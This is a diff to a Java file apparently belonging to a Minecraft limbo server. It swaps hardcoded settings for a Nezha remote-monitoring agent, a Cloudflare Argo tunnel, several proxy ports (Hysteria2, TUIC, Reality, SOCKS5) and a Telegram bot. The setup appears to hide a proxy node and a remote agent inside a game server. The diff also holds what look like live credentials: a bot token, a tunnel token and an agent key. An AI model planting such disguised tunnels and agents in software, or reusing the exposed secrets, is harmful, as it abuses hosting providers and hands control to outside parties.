@@ -122,26 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "dc6b45fb-a250-4beb-be28-de160f279229");
+        envVars.put("UUID", "bd7132e1-6646-4e68-9d06-2b5b610c1798");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         envVars.put("ARGO_PORT", "9123");
-        envVars.put("ARGO_DOMAIN", "trident.tiny.us.ci");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZjBiNmU2YTM4NmE2NWMzNzI2NWE2N2NjYTQ1ZGYzZGUiLCJ0IjoiODg4YjdiZWQtYTRiOC00NTU2LWE5NDAtNGQ2Njk5ZjE1YWQ5IiwicyI6Ik5UazJObVJtWWpJdFl6ZzJOaTAwTURZMExUZzBNekV0T1RBNE5qSmtaRFE0WWpZNSJ9");
-        envVars.put("HY2_PORT", "25602");
-        envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "25602");
-        envVars.put("S5_PORT", "");
-        envVars.put("ANYTLS_PORT", "");
+        envVars.put("ARGO_DOMAIN", "zampto-it.yvy.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiYjg0MWJjZjEtODIyMC00MGRhLTk1MGItNWFhMGU0NjcxMDNiIiwicyI6IllUUTFZVFF6TjJNdE9UbGhPQzAwTVRWaExUZ3lPV0l0TXpJNU9EaGxZekJoTnpjNCJ9");
+        envVars.put("HY2_PORT", "21145");
+        envVars.put("TUIC_PORT", "21239");
+        envVars.put("REALITY_PORT", "21239");
+        envVars.put("S5_PORT", "21145");
+        envVars.put("ANYTLS_PORT", "21286");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "5958841738");
         envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Trident");
+        envVars.put("NAME", "Zampto");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -208,6 +208,7 @@ public final class NanoLimbo {
     }
 
 }
+
 
 
 
